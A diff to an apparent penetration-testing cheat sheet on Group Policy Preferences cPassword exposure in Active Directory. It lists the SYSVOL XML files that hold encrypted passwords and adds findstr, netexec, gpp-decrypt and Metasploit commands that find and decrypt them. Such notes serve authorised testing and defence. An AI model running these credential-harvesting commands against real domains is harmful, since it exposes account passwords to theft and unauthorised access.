@@ -10,10 +10,21 @@ Group Policy Preferences (GPP) allowed admins to embed credentials in XML policy
 
 ---
 
+## Where It's Found
+
+Any domain user can read SYSVOL. The cPassword lives in XML files pushed by GPP:
+
+- `Groups.xml` (most common - local user/admin passwords)
+- `Services.xml`, `ScheduledTasks.xml`, `Printers.xml`, `Drives.xml`, `DataSources.xml`
+
+Any `<... cpassword="...">` attribute = vulnerable.
+
+---
+
 ## Finding cPassword Files
 
 ```sh
-# Search SYSVOL for Groups.xml with cPassword
+# Search SYSVOL for cpassword (from a domain-joined box)
 findstr /S /I cpassword \\<DC>\SYSVOL\*.xml
 
 # From Linux
@@ -25,9 +36,10 @@ find . -name "*.xml" -exec grep -l cpassword {} \;
 
 ## Decrypting the Password
 
-### Automated (Metasploit)
-```
-use post/windows/gather/credentials/gpp
+### Automated (netexec) - finds AND decrypts
+```sh
+nxc smb <DC> -u <user> -p <pass> -M gpp_password
+nxc smb <DC> -u <user> -p <pass> -M gpp_autologin
 ```
 
 ### Manual (gpp-decrypt)
@@ -35,7 +47,11 @@ use post/windows/gather/credentials/gpp
 gpp-decrypt <encrypted-cpassword-string>
 ```
 
-### Online
+### Metasploit
+```
+use post/windows/gather/credentials/gpp
+```
+
 The AES key is publicly known - any gpp-decrypt tool works.
 
 ---
